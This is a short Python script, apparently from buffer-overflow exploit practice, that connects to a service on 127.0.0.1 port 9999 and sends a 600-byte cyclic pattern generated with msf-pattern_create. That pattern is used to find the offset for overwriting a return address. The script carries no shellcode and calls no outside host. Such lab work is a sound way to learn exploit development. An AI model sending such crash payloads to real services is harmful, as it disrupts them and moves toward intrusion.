import socket,sys

#msf-pattern_create -l 600 -s ABCDEFGHIKL,alienum,123456789
payload = "Aa1Aa2Aa3Aa4Aa5Aa6Aa7Aa8Aa9Al1Al2Al3Al4Al5Al6Al7Al8Al9Ai1Ai2Ai3Ai4Ai5Ai6Ai7Ai8Ai9Ae1Ae2Ae3Ae4Ae5Ae6Ae7Ae8Ae9An1An2An3An4An5An6An7An8An9Au1Au2Au3Au4Au5Au6Au7Au8Au9Am1Am2Am3Am4Am5Am6Am7Am8Am9Ba1Ba2Ba3Ba4Ba5Ba6Ba7Ba8Ba9Bl1Bl2Bl3Bl4Bl5Bl6Bl7Bl8Bl9Bi1Bi2Bi3Bi4Bi5Bi6Bi7Bi8Bi9Be1Be2Be3Be4Be5Be6Be7Be8Be9Bn1Bn2Bn3Bn4Bn5Bn6Bn7Bn8Bn9Bu1Bu2Bu3Bu4Bu5Bu6Bu7Bu8Bu9Bm1Bm2Bm3Bm4Bm5Bm6Bm7Bm8Bm9Ca1Ca2Ca3Ca4Ca5Ca6Ca7Ca8Ca9Cl1Cl2Cl3Cl4Cl5Cl6Cl7Cl8Cl9Ci1Ci2Ci3Ci4Ci5Ci6Ci7Ci8Ci9Ce1Ce2Ce3Ce4Ce5Ce6Ce7Ce8Ce9Cn1Cn2Cn3Cn4Cn5Cn6Cn7Cn8Cn9Cu1Cu2Cu3Cu4Cu5Cu6Cu7Cu8Cu9Cm1Cm2Cm3Cm4Cm5Cm6Cm7Cm8Cm9Da1Da2Da3Da4Da5Da6Da7Da8Da9Dl1Dl2"

try: 
    s = socket.socket(socket.AF_INET,socket.SOCK_STREAM)
    s.connect(('127.0.0.1',9999))
    s.recv(1024)
    s.send(payload)
    s.close()
except:
    print("[X] Connection error")
    sys.exit()